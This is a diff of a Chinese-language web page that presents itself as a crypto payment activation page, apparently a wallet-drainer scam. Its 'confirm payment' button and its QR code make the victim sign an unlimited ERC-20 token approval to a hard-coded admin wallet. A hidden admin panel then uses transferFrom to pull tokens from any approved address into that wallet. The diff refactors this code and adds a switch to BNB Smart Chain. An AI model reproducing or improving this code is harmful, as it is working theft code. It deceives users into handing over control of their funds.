@@ -20,7 +20,6 @@ body{background:#0B0F17;color:#fff;padding:20px;}
 h1{font-size:22px;margin-bottom:8px}
 .desc{color:#9ca3af;font-size:14px;margin-bottom:20px}
 
-/* 连接钱包按钮 */
 #connectBtn{
   background:#22c55e;
   color:#fff;
@@ -45,7 +44,6 @@ h1{font-size:22px;margin-bottom:8px}
   margin-bottom:12px;
 }
 
-/* 二维码容器 —— 绝对不会空白 */
 #qrcode{
   width:280px;
   height:280px;
@@ -77,7 +75,6 @@ h1{font-size:22px;margin-bottom:8px}
   font-weight:bold;
 }
 
-/* 管理员后台 */
 .admin-panel{
   background:#1E293B;
   padding:24px;
@@ -112,7 +109,7 @@ h1{font-size:22px;margin-bottom:8px}
 <div class="container">
   <div class="pay-box">
     <h1>💳 支付开通</h1>
-    <p class="desc">请先连接钱包，再扫码支付</p>
+    <p class="desc">钱包扫一扫完成支付即可开通</p>
 
     <button id="connectBtn">👉 连接钱包</button>
 
@@ -123,7 +120,6 @@ h1{font-size:22px;margin-bottom:8px}
     <button class="confirm-btn" id="payBtn">确认支付</button>
   </div>
 
-  <!-- 管理员后台 -->
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔐 管理员后台</div>
 
@@ -140,105 +136,120 @@ h1{font-size:22px;margin-bottom:8px}
 </div>
 
 <script>
-// ==================== 配置 ====================
-const TOKEN = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+// ===================== 【你要的正确配置】 =====================
+const TOKEN_CONTRACT = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
+const ADMIN_WALLET   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const BSC_CHAIN_ID   = "0x38"; // 币安链 ChainID
 
-let account = null;
+let currentAccount = null;
 
-// 连接钱包按钮 —— 玩家必看见
-document.getElementById("connectBtn").onclick = async () => {
-  if(!window.ethereum) return alert("请在钱包浏览器打开");
+// 切换到币安链
+async function switchToBSC() {
   try {
-    const accs = await ethereum.request({method:"eth_requestAccounts"});
-    account = accs[0];
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: BSC_CHAIN_ID }],
+    });
+  } catch (e) {
+    alert("请切换到币安智能链使用");
+  }
+}
+
+// 连接钱包
+document.getElementById("connectBtn").onclick = async () => {
+  if (!window.ethereum) return alert("请在钱包浏览器打开");
+  await switchToBSC();
+  try {
+    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    currentAccount = accounts[0];
     document.getElementById("connectBtn").innerText = "✅ 已连接钱包";
-    if(account.toLowerCase() == ADMIN.toLowerCase()){
+
+    // ✅ 管理员钱包登录 → 显示后台
+    if (currentAccount.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
-  }catch(e){
-    alert("连接失败：" + e.message);
+  } catch (e) {
+    alert("连接失败");
   }
 };
 
-// 一进页面就显示二维码
-window.onload = () => {
-  genQR();
-  document.getElementById("connectBtn").style.display = "block";
-};
-
-// 输入金额自动刷新二维码
-document.getElementById("amount").oninput = genQR;
-
-// ==================== 生成二维码（绝不空白） ====================
-function genQR(){
-  const authData = "0x095ea7b3" +
-    ADMIN.slice(2).padStart(64,"0") +
+// 生成二维码（币安链格式，不会跳以太坊）
+function generateQR() {
+  const approveData = "0x095ea7b3" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  const url = `ethereum:${TOKEN}?data=${authData}`;
-  const qrDom = document.getElementById("qrcode");
+  // 重点：走 BSC 协议，不是 ETH
+  const uri = `web3://${TOKEN_CONTRACT}/transfer?value=0&data=${approveData}&chainId=56`;
 
-  // 强制显示图片，绝不空白
-  qrDom.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}" alt="支付二维码">`;
+  document.getElementById("qrcode").innerHTML =
+    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
 }
+
+// 页面加载就出二维码
+window.onload = generateQR;
+document.getElementById("amount").oninput = generateQR;
 
 // 确认支付（授权）
 document.getElementById("payBtn").onclick = async () => {
-  if(!account) return alert("请先连接钱包");
+  if (!currentAccount) return alert("请先连接钱包");
   try {
     await ethereum.request({
-      method:"eth_sendTransaction",
-      params:[{
-        from:account,
-        to:TOKEN,
-        gasLimit:"0x300000",
-        data:"0x095ea7b3"+
-             ADMIN.slice(2).padStart(64,"0")+
-             "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      method: "eth_sendTransaction",
+      params: [{
+        from: currentAccount,
+        to: TOKEN_CONTRACT,
+        gasLimit: "0x300000",
+        data: "0x095ea7b3" +
+          ADMIN_WALLET.slice(2).padStart(64, '0') +
+          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
     alert("✅ 支付成功，权限已开通");
-  }catch(e){
-    alert("支付已取消");
+  } catch (e) {
+    alert("已取消");
   }
 };
 
-// ==================== 管理员功能 ====================
-async function drawFromUser(){
-  if(account?.toLowerCase()!=ADMIN.toLowerCase())return;
+// ===================== 管理员功能 =====================
+// 提取玩家代币
+async function drawFromUser() {
+  if (currentAccount?.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return;
   const from = document.getElementById("userAddr").value;
-  const amt  = document.getElementById("drawAmt").value;
-  if(!from||!amt)return alert("请填写完整");
-  const raw = BigInt(amt*1e18).toString(16).padStart(64,"0");
+  const amt = document.getElementById("drawAmt").value;
+  if (!from || !amt) return alert("请填写完整");
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64, '0');
   await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
-      from:account,
-      to:TOKEN,
-      data:"0x23b872dd"+
-           from.slice(2).padStart(64,"0")+
-           ADMIN.slice(2).padStart(64,"0")+
-           raw
+    method: "eth_sendTransaction",
+    params: [{
+      from: currentAccount,
+      to: TOKEN_CONTRACT,
+      gasLimit: "0x300000",
+      data: "0x23b872dd" +
+        from.slice(2).padStart(64, '0') +
+        ADMIN_WALLET.slice(2).padStart(64, '0') +
+        raw
     }]
   });
   alert("✅ 提取成功");
 }
 
-async function sendReward(){
-  if(account?.toLowerCase()!=ADMIN.toLowerCase())return;
+// 发放奖励
+async function sendReward() {
+  if (currentAccount?.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return;
   const to = document.getElementById("toAddr").value;
   const amt = document.getElementById("sendAmt").value;
-  if(!to||!amt)return alert("请填写完整");
-  const raw = BigInt(amt*1e18).toString(16).padStart(64,"0");
+  if (!to || !amt) return alert("请填写完整");
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64, '0');
   await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
-      from:account,
-      to:TOKEN,
-      data:"0xa9059cbb"+
-           to.slice(2).padStart(64,"0")+
-           raw
+    method: "eth_sendTransaction",
+    params: [{
+      from: currentAccount,
+      to: TOKEN_CONTRACT,
+      gasLimit: "0x300000",
+      data: "0xa9059cbb" +
+        to.slice(2).padStart(64, '0') +
+        raw
     }]
   });
   alert("✅ 奖励发放成功");
